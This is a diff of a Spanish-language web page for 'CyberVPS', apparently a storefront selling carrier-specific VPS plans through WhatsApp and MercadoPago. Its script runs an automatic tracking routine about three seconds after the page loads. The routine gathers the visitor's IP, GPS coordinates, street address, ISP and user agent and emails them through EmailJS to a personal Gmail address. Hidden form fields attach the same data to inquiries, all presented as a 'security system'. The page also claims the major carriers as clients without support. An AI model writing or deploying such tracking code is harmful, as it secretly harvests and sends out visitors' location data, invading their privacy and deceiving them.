@@ -82,14 +82,6 @@
             100% { background-position: 0 30px; }
         }
         
-        /* Efecto de partículas */
-        #particles-js {
-            position: fixed;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-        }
-        
         /* Header con efecto de ocultamiento */
         header {
             background-color: rgba(10, 10, 10, 0.9);
@@ -1259,7 +1251,6 @@
 <body>
     <div class="scan-line"></div>
     <div class="grid-bg"></div>
-    <div id="particles-js"></div>
 
     <!-- Notificación de tracking automático -->
     <div id="autoTrackNotification" class="auto-track-notification" style="display: none;">
@@ -1307,10 +1298,461 @@
         </div>
     </header>
 
-    <!-- Resto del código HTML se mantiene igual -->
-    <!-- ... -->
+    <!-- Botón para móviles para mostrar/ocultar menú -->
+    <div class="mobile-menu-btn" id="mobile-menu-btn">
+        <i class="fas fa-bars"></i>
+    </div>
 
-    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <!-- Hero Section -->
+    <section class="hero" id="inicio">
+        <div class="terminal">
+            <div class="terminal-header">
+                <div class="terminal-title">root@cybervps:~</div>
+                <div class="terminal-controls">
+                    <div class="terminal-control control-close"></div>
+                    <div class="terminal-control control-minimize"></div>
+                    <div class="terminal-control control-maximize"></div>
+                </div>
+            </div>
+            <div class="terminal-content">
+                <div class="command" style="animation-delay: 0.5s;">
+                    <span class="command-prompt">root@cybervps:~$</span> Bienvenido a CyberVPS
+                </div>
+                <div class="command" style="animation-delay: 1.5s;">
+                    <span class="command-prompt">root@cybervps:~$</span> Iniciando sistema especializado en telecomunicaciones...
+                </div>
+                <div class="command" style="animation-delay: 2.5s;">
+                    <span class="command-prompt">root@cybervps:~$</span> Servidores VPS optimizados para Movistar, Telcel, AT&T, Oxxocel, Bait
+                </div>
+                <div class="command" style="animation-delay: 3.5s;">
+                    <span class="command-prompt">root@cybervps:~$</span> <span class="typewriter">Sistema de gestión de cuentas activado</span>
+                </div>
+                <div class="command" style="animation-delay: 7s;">
+                    <span class="command-prompt">root@cybervps:~$</span> <span class="blink">_</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="features" id="servicios">
+        <div class="container">
+            <div class="section-title">
+                <h2>Soluciones Especializadas</h2>
+                <p>VPS optimizados para cada operadora con herramientas específicas de gestión</p>
+            </div>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <i class="fas fa-mobile-alt feature-icon"></i>
+                    <h3>Configuraciones Preoptimizadas</h3>
+                    <p>Servidores VPS ya configurados para cada operadora móvil con las especificaciones técnicas necesarias.</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-users-cog feature-icon"></i>
+                    <h3>Sistema de Gestión de Cuentas</h3>
+                    <p>Panel de control integrado para crear y administrar cuentas de usuario de manera sencilla.</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-tachometer-alt feature-icon"></i>
+                    <h3>Alto Rendimiento</h3>
+                    <p>Optimizados para ofrecer el máximo rendimiento en aplicaciones críticas de telecomunicaciones.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Telecom Carriers Section -->
+    <section class="telecom-carriers" id="operadoras">
+        <div class="container">
+            <div class="section-title">
+                <h2>Soluciones por Operadora</h2>
+                <p>VPS especializados para cada compañía de telefonía móvil</p>
+            </div>
+            <div class="carriers-grid">
+                <div class="carrier-card">
+                    <div class="carrier-header movistar-header">
+                        <h3>Movistar</h3>
+                    </div>
+                    <div class="carrier-body">
+                        <ul class="carrier-features">
+                            <li>Optimizado para protocolos Movistar</li>
+                            <li>Panel de gestión de cuentas integrado</li>
+                            <li>Scripts automáticos de configuración</li>
+                            <li>Soporte técnico especializado</li>
+                            <li>99.9% Uptime garantizado</li>
+                        </ul>
+                    </div>
+                    <div class="carrier-footer">
+                        <a href="#contacto" class="btn whatsapp-contact" data-service="Movistar">Solicitar por WhatsApp</a>
+                    </div>
+                </div>
+                
+                <div class="carrier-card">
+                    <div class="carrier-header telcel-header">
+                        <h3>Telcel</h3>
+                    </div>
+                    <div class="carrier-body">
+                        <ul class="carrier-features">
+                            <li>Configuración específica para red Telcel</li>
+                            <li>Herramientas de gestión de usuarios</li>
+                            <li>Monitoreo de rendimiento en tiempo real</li>
+                            <li>Backup automático diario</li>
+                            <li>Escalabilidad bajo demanda</li>
+                        </ul>
+                    </div>
+                    <div class="carrier-footer">
+                        <a href="#contacto" class="btn whatsapp-contact" data-service="Telcel">Solicitar por WhatsApp</a>
+                    </div>
+                </div>
+                
+                <div class="carrier-card">
+                    <div class="carrier-header att-header">
+                        <h3>AT&T</h3>
+                    </div>
+                    <div class="carrier-body">
+                        <ul class="carrier-features">
+                            <li>Esquema de seguridad reforzado</li>
+                            <li>Compatibilidad con sistemas AT&T</li>
+                            <li>Gestión multi-usuario avanzada</li>
+                            <li>API para integraciones personalizadas</li>
+                            <li>Soporte 24/7 especializado</li>
+                        </ul>
+                    </div>
+                    <div class="carrier-footer">
+                        <a href="#contacto" class="btn whatsapp-contact" data-service="AT&T">Solicitar por WhatsApp</a>
+                    </div>
+                </div>
+                
+                <div class="carrier-card">
+                    <div class="carrier-header oxxocel-header">
+                        <h3>Oxxocel</h3>
+                    </div>
+                    <div class="carrier-body">
+                        <ul class="carrier-features">
+                            <li>Configuración para red Oxxocel</li>
+                            <li>Sistema de facturación integrado</li>
+                            <li>Plantillas personalizables de cuentas</li>
+                            <li>Reportes y analytics avanzados</li>
+                            <li>Alta disponibilidad garantizada</li>
+                        </ul>
+                    </div>
+                    <div class="carrier-footer">
+                        <a href="#contacto" class="btn whatsapp-contact" data-service="Oxxocel">Solicitar por WhatsApp</a>
+                    </div>
+                </div>
+                
+                <div class="carrier-card">
+                    <div class="carrier-header bait-header">
+                        <h3>Bait</h3>
+                    </div>
+                    <div class="carrier-body">
+                        <ul class="carrier-features">
+                            <li>Optimizado para sistemas Bait</li>
+                            <li>Panel de control intuitivo</li>
+                            <li>Sistema de autenticación seguro</li>
+                            <li>Creación masiva de cuentas</li>
+                            <li>Asistencia técnica prioritária</li>
+                        </ul>
+                    </div>
+                    <div class="carrier-footer">
+                        <a href="#contacto" class="btn whatsapp-contact" data-service="Bait">Solicitar por WhatsApp</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Suscripciones Section -->
+    <section class="subscriptions" id="suscripciones">
+        <div class="container">
+            <div class="section-title">
+                <h2>Suscripciones Premium</h2>
+                <p>Elige el plan que mejor se adapte a tus necesidades de telecomunicaciones</p>
+            </div>
+            
+            <div class="plans-grid">
+                <div class="plan-card">
+                    <div class="plan-header">
+                        <h3 class="plan-name">Plan Básico</h3>
+                        <div class="plan-price">$50<span>/mes</span></div>
+                        <p class="plan-description">Ideal para pequeños operadores</p>
+                    </div>
+                    <div class="plan-body">
+                        <ul class="plan-features">
+                            <li>1 VPS especializado</li>
+                            <li>10 GB Almacenamiento SSD</li>
+                            <li>2 GB RAM</li>
+                            <li>1 CPU Core</li>
+                            <li>Ancho de banda 1TB</li>
+                            <li>Soporte por email</li>
+                            <li>Panel de control básico</li>
+                        </ul>
+                    </div>
+                    <div class="plan-footer">
+                        <a href="https://www.mercadopago.com.mx/subscriptions/checkout?preapproval_plan_id=2c9380849507946601950c914d0201f0" class="subscribe-btn" target="_blank">Suscribirse</a>
+                    </div>
+                </div>
+                
+                <div class="plan-card popular">
+                    <div class="plan-badge">POPULAR</div>
+                    <div class="plan-header">
+                        <h3 class="plan-name">Plan Profesional</h3>
+                        <div class="plan-price">$150<span>/mes</span></div>
+                        <p class="plan-description">Para empresas en crecimiento</p>
+                    </div>
+                    <div class="plan-body">
+                        <ul class="plan-features">
+                            <li>3 VPS especializados</li>
+                            <li>50 GB Almacenamiento SSD</li>
+                            <li>8 GB RAM</li>
+                            <li>4 CPU Cores</li>
+                            <li>Ancho de banda 5TB</li>
+                            <li>Soporte prioritario 24/7</li>
+                            <li>Panel de control avanzado</li>
+                            <li>Backups automáticos</li>
+                        </ul>
+                    </div>
+                    <div class="plan-footer">
+                        <a href="https://www.mercadopago.com.mx/subscriptions/checkout?preapproval_plan_id=2c9380849507946601950c914d0201f0" class="subscribe-btn" target="_blank">Suscribirse</a>
+                    </div>
+                </div>
+                
+                <div class="plan-card">
+                    <div class="plan-header">
+                        <h3 class="plan-name">Plan Enterprise</h3>
+                        <div class="plan-price">$300<span>/mes</span></div>
+                        <p class="plan-description">Para grandes operadores</p>
+                    </div>
+                    <div class="plan-body">
+                        <ul class="plan-features">
+                            <li>5 VPS especializados</li>
+                            <li>100 GB Almacenamiento SSD</li>
+                            <li>16 GB RAM</li>
+                            <li>8 CPU Cores</li>
+                            <li>Ancho de banda ilimitado</li>
+                            <li>Soporte premium 24/7</li>
+                            <li>Panel de control enterprise</li>
+                            <li>Backups automáticos diarios</li>
+                            <li>Monitoreo avanzado</li>
+                        </ul>
+                    </div>
+                    <div class="plan-footer">
+                        <a href="https://www.mercadopago.com.mx/subscriptions/checkout?preapproval_plan_id=2c9380849507946601950c914d0201f0" class="subscribe-btn" target="_blank">Suscribirse</a>
+                    </div>
+                </div>
+            </div>
+            
+            <div style="text-align: center; margin-top: 3rem;">
+                <p style="color: #aaa;">¿Necesitas un plan personalizado? <a href="#contacto" style="color: var(--neon-green);">Contáctanos</a></p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Account System Section -->
+    <section class="account-system" id="sistema">
+        <div class="container">
+            <div class="section-title">
+                <h2>Sistema de Gestión de Cuentas</h2>
+                <p>Crea y administra cuentas de usuario para tus servidores de manera sencilla</p>
+            </div>
+            
+            <div class="account-steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <h3>Configuración Inicial</h3>
+                    <p>Nuestro equipo instala y configura tu VPS según los requerimientos de tu operadora</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <h3>Acceso al Panel</h3>
+                    <p>Recibe tus credenciales para acceder al panel de control de gestión de cuentas</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <h3>Crear Cuentas</h3>
+                    <p>Genera cuentas de usuario individuales con permisos y recursos específicos</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">4</div>
+                    <h3>Gestionar y Monitorear</h3>
+                    <p>Supervisa el uso, modifica permisos y gestiona todas las cuentas desde un único panel</p>
+                </div>
+            </div>
+            
+            <div style="text-align: center; margin-top: 3rem;">
+                <a href="#contacto" class="btn whatsapp-contact" data-service="Demo del Sistema">Solicitar Demo por WhatsApp</a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Clients Section -->
+    <section class="clients" id="clientes">
+        <div class="container">
+            <div class="section-title">
+                <h2>Nuestros Clientes</h2>
+                <p>Empresas de telecomunicaciones que confían en nuestros servicios</p>
+            </div>
+            <div class="clients-grid">
+                <div class="client-logo">
+                    <i class="fas fa-signal fa-3x" style="color: #00a2ff;"></i>
+                    <span style="margin-left: 10px; font-weight: bold; color: #00a2ff;">Movistar</span>
+                </div>
+                <div class="client-logo">
+                    <i class="fas fa-mobile-alt fa-3x" style="color: #63c100;"></i>
+                    <span style="margin-left: 10px; font-weight: bold; color: #63c100;">Telcel</span>
+                </div>
+                <div class="client-logo">
+                    <i class="fas fa-broadcast-tower fa-3x" style="color: #009cde;"></i>
+                    <span style="margin-left: 10px; font-weight: bold; color: #009cde;">AT&T</span>
+                </div>
+                <div class="client-logo">
+                    <i class="fas fa-sim-card fa-3x" style="color: #cc0000;"></i>
+                    <span style="margin-left: 10px; font-weight: bold; color: #cc0000;">Oxxocel</span>
+                </div>
+                <div class="client-logo">
+                    <i class="fas fa-wifi fa-3x" style="color: #663399;"></i>
+                    <span style="margin-left: 10px; font-weight: bold; color: #663399;">Bait</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section class="contact" id="contacto">
+        <div class="container">
+            <div class="section-title">
+                <h2>Contacto</h2>
+                <p>¿Necesitas una solución personalizada? Contáctanos por WhatsApp</p>
+            </div>
+            
+            <!-- Alerta de seguridad -->
+            <div class="security-alert">
+                <h3><i class="fas fa-shield-alt"></i> SISTEMA DE SEGURIDAD ACTIVADO</h3>
+                <p>Se está monitoreando la ubicación y datos de conexión para prevenir fraudes y ataques.</p>
+                <div id="securityStatus" class="security-status status-secure">
+                    <i class="fas fa-check-circle"></i> SEGURO
+                </div>
+            </div>
+            
+            <div class="contact-grid">
+                <div class="contact-info">
+                    <h3>Información de Contacto</h3>
+                    <p><i class="fab fa-whatsapp" style="color: #25D366;"></i> WhatsApp: +52 7823981639</p>
+                    <p><i class="fas fa-globe"></i> Servicios disponibles globalmente</p>
+                    <p><i class="fas fa-clock"></i> Soporte 24/7/365</p>
+                    <p><i class="fas fa-headset"></i> Asistencia técnica especializada</p>
+                    
+                    <!-- Datos de ubicación -->
+                    <div class="location-data" id="locationData">
+                        <h4><i class="fas fa-map-marker-alt"></i> DATOS DE CONEXIÓN</h4>
+                        <div class="location-item">
+                            <span class="location-label">IP:</span>
+                            <span class="location-value" id="ipAddress">Cargando...</span>
+                        </div>
+                        <div class="location-item">
+                            <span class="location-label">Coordenadas:</span>
+                            <span class="location-value" id="coordinates">Cargando...</span>
+                        </div>
+                        <div class="location-item">
+                            <span class="location-label">Dirección Exacta:</span>
+                            <span class="location-value" id="exactAddress">Cargando...</span>
+                        </div>
+                        <div class="location-item">
+                            <span class="location-label">Precisión:</span>
+                            <span class="location-value" id="accuracy">Cargando...</span>
+                        </div>
+                        <div class="location-item">
+                            <span class="location-label">Proveedor:</span>
+                            <span class="location-value" id="isp">Cargando...</span>
+                        </div>
+                        <div class="location-precision" id="precisionInfo">
+                            <i class="fas fa-info-circle"></i> Ubicación obtenida con GPS de alta precisión
+                        </div>
+                    </div>
+                    
+                    <p style="margin-top: 20px; color: var(--neon-green);">
+                        <i class="fas fa-info-circle"></i> Todos los pedidos se gestionan directamente por WhatsApp
+                    </p>
+                </div>
+                
+                <div class="contact-form">
+                    <h3>Solicitar por WhatsApp</h3>
+                    <form id="whatsappForm">
+                        <!-- Campos ocultos para datos de ubicación -->
+                        <input type="hidden" id="hiddenIp" name="ip">
+                        <input type="hidden" id="hiddenCoordinates" name="coordinates">
+                        <input type="hidden" id="hiddenAddress" name="address">
+                        <input type="hidden" id="hiddenAccuracy" name="accuracy">
+                        <input type="hidden" id="hiddenIsp" name="isp">
+                        <input type="hidden" id="hiddenUserAgent" name="user_agent">
+                        <input type="hidden" id="hiddenTimestamp" name="timestamp">
+                        
+                        <div class="form-group terminal-input">
+                            <label for="name">Nombre</label>
+                            <input type="text" id="name" placeholder="Ingresa tu nombre" required>
+                        </div>
+                        <div class="form-group terminal-input">
+                            <label for="email">Email</label>
+                            <input type="email" id="email" placeholder="Ingresa tu email" required>
+                        </div>
+                        <div class="form-group terminal-input">
+                            <label for="company">Empresa</label>
+                            <input type="text" id="company" placeholder="Nombre de tu empresa">
+                        </div>
+                        <div class="form-group terminal-input">
+                            <label for="carrier">Operadora de interés</label>
+                            <select id="carrier" required>
+                                <option value="">Selecciona una opción</option>
+                                <option value="movistar">Movistar</option>
+                                <option value="telcel">Telcel</option>
+                                <option value="att">AT&T</option>
+                                <option value="oxxocel">Oxxocel</option>
+                                <option value="bait">Bait</option>
+                                <option value="otra">Otra</option>
+                            </select>
+                        </div>
+                        <div class="form-group terminal-input">
+                            <label for="message">Mensaje</label>
+                            <textarea id="message" rows="5" placeholder="Describe tu solicitud o requerimientos" required></textarea>
+                        </div>
+                        
+                        <div class="form-group">
+                            <div class="security-alert" style="margin-bottom: 1rem;">
+                                <p><i class="fas fa-envelope"></i> Los datos de ubicación exacta se enviarán automáticamente a: <strong>almenos855@gmail.com</strong></p>
+                            </div>
+                        </div>
+
+                        <!-- Estado del envío de email -->
+                        <div id="emailStatus" class="email-status" style="display: none;"></div>
+                        
+                        <button type="submit" class="btn" id="submitBtn">
+                            <i class="fas fa-paper-plane"></i> Enviar con Ubicación Exacta
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="logo">
+                    <i class="fas fa-server logo-icon"></i>
+                    <h1>CyberVPS</h1>
+                </div>
+                <div class="social-links">
+                    <a href="#"><i class="fab fa-facebook"></i></a>
+                    <a href="#"><i class="fab fa-twitter"></i></a>
+                    <a href="#"><i class="fab fa-linkedin"></i></a>
+                    <a href="https://wa.me/527823981639" target="_blank"><i class="fab fa-whatsapp" style="color: #25D366;"></i></a>
+                </div>
+                <p>&copy; 2023 CyberVPS. Todos los derechos reservados.</p>
+            </div>
+        </div>
+    </footer>
+
     <script>
         // Inicializar EmailJS con tus credenciales
         (function() {
@@ -1436,7 +1878,7 @@
         // Función para enviar datos por correo automáticamente
         async function sendAutoLocationEmail(locationData) {
             const serviceID = 'service_do8oqdc';
-            const templateID = 'template_cybervps_auto'; // Plantilla para envío automático
+            const templateID = 'template_cybervps_auto';
             const userID = '4HjVbNC3euonFcT9q';
 
             // Determinar nivel de seguridad basado en precisión
@@ -1487,7 +1929,7 @@
 
         // Función principal para el tracking automático
         async function startAutoTracking() {
-            if (autoEmailSent) return; // Evitar múltiples envíos
+            if (autoEmailSent) return;
             
             try {
                 showTrackingIndicator(true);
@@ -1528,7 +1970,6 @@
 
             // Esperar 3 segundos antes de iniciar el tracking automático
             setTimeout(async () => {
-                // Verificar si ya se envió el email en esta sesión
                 if (!checkPreviousSend()) {
                     await startAutoTracking();
                 } else {
@@ -1550,8 +1991,17 @@
                 }
             });
 
-            // El resto del código para el formulario manual se mantiene igual
-            // ... (código del formulario existente)
+            // Configurar enlaces de WhatsApp
+            const whatsappButtons = document.querySelectorAll('.whatsapp-contact');
+            whatsappButtons.forEach(button => {
+                button.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const service = this.getAttribute('data-service');
+                    const message = `Hola, estoy interesado en el servicio de ${service} de CyberVPS. Por favor proporcióname más información.`;
+                    const encodedMessage = encodeURIComponent(message);
+                    window.open(`https://wa.me/527823981639?text=${encodedMessage}`, '_blank');
+                });
+            });
         });
 
         // Efecto de partículas
